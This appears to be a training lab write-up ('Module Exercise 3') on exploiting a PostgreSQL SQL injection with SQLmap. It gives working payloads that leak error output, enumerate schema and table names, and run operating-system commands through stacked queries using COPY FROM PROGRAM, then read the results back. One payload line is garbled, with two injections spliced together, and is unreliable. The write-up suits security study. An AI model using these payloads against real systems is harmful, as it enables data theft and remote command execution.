#### Module Exercise 3
Using SQLmap, we find that “height” is injectable with boolean-based blind and error-based and appears to be PostgreSQL.

%27%20AND%20%28SELECT%20%28CASE%20WHEN%20%281944%3D5147%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28101%29%7C%7CCHR%28119%29%7C%7CCHR%2886%29%7C%7CCHR%28101%
29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL--%20BNyU

which decodes to:

' AND (SELECT (CASE WHEN (1944=5147) THEN NULL ELSE CAST((CHR(101)||CHR(119)||CHR(86)||CHR(101%
29) AS NUMERIC) END)) IS NULL-- BNyU

This injection causes the page to display an error:

Warning: pg_query(): Query failed: ERROR: invalid input syntax for type numeric: "ewVe" in /var/www/html/class.php on line 423


WHERE or HAVING clause (CAST)' injectable (with --not-string="423") 


The most simple I could make this query is:

' AND (SELECT (CASE WHEN (1=2) THEN NULL ELSE CAST((CHR(101)) AS NUMERIC) END)) IS NULL-- BYE

This payload dumps the word “public”
' AND (SELECT (CASE WHEN' AND 7369=CAST((CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113))||(SELECT DISTINCT(COALESCE(CAST(schemaname AS VARCHAR(10000))::text,(CHR(32)))) FROM pg_tables OFFSET 0 LIMIT 1)::text||(CHR(113)||CHR(113)||CHR(112)||CHR(98)||CHR(113)) AS NUMERIC)-- SZaG (1944=5147) THEN NULL ELSE CAST((CHR(101)||CHR(119)||CHR(86)||CHR(101%
29) AS NUMERIC) END)) IS NULL-- BNyU

By changing the Offset value I will find all the table names.

In order to obtain a shell, I need to use stacked queries.

The shell outputs its commands to an SQL table.
';DROP TABLE IF EXISTS sqlmapoutput;CREATE TABLE sqlmapoutput(data text);COPY sqlmapoutput FROM PROGRAM 'ls ../';--

To retrieve the output:

' AND 1112=CAST((CHR(113)||CHR(106)||CHR(107)||CHR(120)||CHR(113))||(SELECT COALESCE(CAST(data AS VARCHAR(10000))::text,(CHR(32))) FROM sqlmapoutput)::text||(CHR(113)||CHR(106)||CHR(112)||CHR(98)||CHR(113)) AS NUMERIC)-- zKvf

Change the offset in the following to get multiple lines of output:
' AND 6803=CAST((CHR(113)||CHR(106)||CHR(107)||CHR(120)||CHR(113))||(SELECT COALESCE(CAST(data AS VARCHAR(10000))::text,(CHR(32))) FROM sqlmapoutput OFF
SET 114 LIMIT 1)::text||(CHR(113)||CHR(106)||CHR(112)||CHR(98)||CHR(113)) AS NUMERIC)-- Bwna

/usr/local/pgsql/data

